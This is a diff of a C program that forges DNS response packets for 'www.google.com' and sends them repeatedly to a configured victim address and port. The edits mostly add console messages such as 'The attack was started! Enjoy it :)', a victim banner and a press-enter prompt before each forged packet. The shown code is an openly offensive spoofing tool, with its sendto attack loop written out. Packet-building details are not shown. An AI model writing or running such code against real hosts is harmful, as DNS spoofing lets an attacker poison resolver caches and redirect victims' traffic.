@@ -6,6 +6,7 @@
 
 int main()
 {
+	system("@cls||clear");
 	startAttack();
 	return 0;
 }
@@ -23,11 +24,11 @@ void checkSocket()
 {
 	if(sck == -1)
 	{
-		printf("There was a problem creating the socket\n");
+		printf("\nThere was a problem creating the socket\n");
 		exit(1);
 	}
 	else
-		printf("Socket was successfully created!\n");
+		printf("\nSocket was successfully created!\n");
 }
 
 void bindPort()
@@ -60,14 +61,22 @@ void toAttack()
 	unsigned char host[_LEN];
 	//printf("\n=> TYPE ANY HOST TO START ATTACK: ");
 	//scanf("%s", host);
+
 	strcpy(host, "www.google.com");
-	printf("The attack was started! Enjoy it :)\n");
+
+	printf("\n***** The attack was started! Enjoy it :) *****\n");
+	printf("Victim: [%s:%d]\n", _VICTIM_ADDRESS, _VICTIM_PORT);
+
 	mountDnsPackage((unsigned char) _RESPONSE, buffer, host);
+
 	while (true)
 	{
+		printf("\n=> Press <enter> to send a forged package to the victim...\n");
 		getchar();
 		if (sendto(sck, (char*) buffer, sizeof(struct DNS_H) + (strlen(host)+1) + sizeof(struct QUESTION), 0, (struct sockaddr*)&victim, sizeAddr) < 0)
 	        printf("\nSendto local host failed!\n");
+		else 
+			printf("Yes! You were great. :D\n");
 	}
 }
 
